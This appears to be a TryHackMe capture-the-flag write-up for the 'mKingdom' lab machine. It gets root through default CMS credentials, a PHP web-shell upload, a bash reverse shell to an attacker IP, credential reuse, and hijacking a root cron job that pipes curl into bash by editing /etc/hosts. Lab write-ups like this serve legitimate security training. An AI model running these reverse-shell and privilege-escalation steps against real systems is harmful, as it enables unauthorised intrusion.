---
title: mKingdom
description: 'Using default credentials to access the CMS, uploading a malicious PHP file to get RCE and escalating privileges using write access to /etc/hosts'
pubDate: 2024-06-28
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/5198d5eb4284a2eeffe5eea07094d45d.png'
---

Running Feroxbuser:
```bash
feroxbuster -u http://10.10.178.0:85
```

Eventually we find a CMS website:
```html
meta name="generator" content="concrete5 - 8.5.2"/>
```

## RCE
The login page is: http://10.10.178.0:85/app/castle/index.php/login

Guessing: admin/password

allow PHP file extension to be uploaded.
Upload a cmd.php file
RCE: http://10.10.178.0:85/app/castle/application/files/6917/1957/4907/cmd.php?cmd=id

```bash
bash -c 'bash -i >& /dev/tcp/10.8.119.137/4444 0>&1'
```

Post request to `cmd.php`:
```
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.119.137/4444+0>%261'
```

## ENUM

```php
www-data@mkingdom:/var/www/html/app/castle/application/config$ cat database.php
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

## USER

Password re-use:
```bash
su toad # <- toadisthebest
```

## USER 2

In toad's `.bashrc` there is a `PWD_token`:

```bash
cat ~/.bashrc
...[snip]...
export PWD_token='aWthVGVOVEFOdEVTCg=='
```

```bash
echo $PWD_token | base64 -d
ikaTeNTANtES

su mario # <-- ikaTeNTANtES
```
## READING MARIO's FILES

Switching back to `toad` and running:
```bash
chmod 0755 /bin/cat
```
Now we can read with the `mario` user in its home dir.

## ROOT

Running `pspy` we can see that there is a process running each minute:

```bash
2024/07/01 14:39:01 CMD: UID=0     PID=27832  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
```
We can't edit `/var/www/html/app/castle/application/counter.sh` since its owned by root.

For some reason `mario` can edit `/etc/hosts` and since its requesting a script from host `mkingdom.thm` we can point it to our own machine.

Updating `/etc/hosts` with:
```
10.8.119.137    mkingdom.thm
```
Now every minute the host is requesting `counter.sh` from our machine and piping it into bash.

We can create a malicious `counter.sh` script (at `app/castle/application/counter.sh`) and this will be executed by the host as root.

```bash
sudo python3 -m http.server 85
Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
10.10.178.0 - - [01/Jul/2024 20:33:01] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
```

At the minute mark we get a callback and a shell as root:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.119.137] from (UNKNOWN) [10.10.178.0] 40440
bash: cannot set terminal process group (27734): Inappropriate ioctl for device
bash: no job control in this shell
root@mkingdom:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
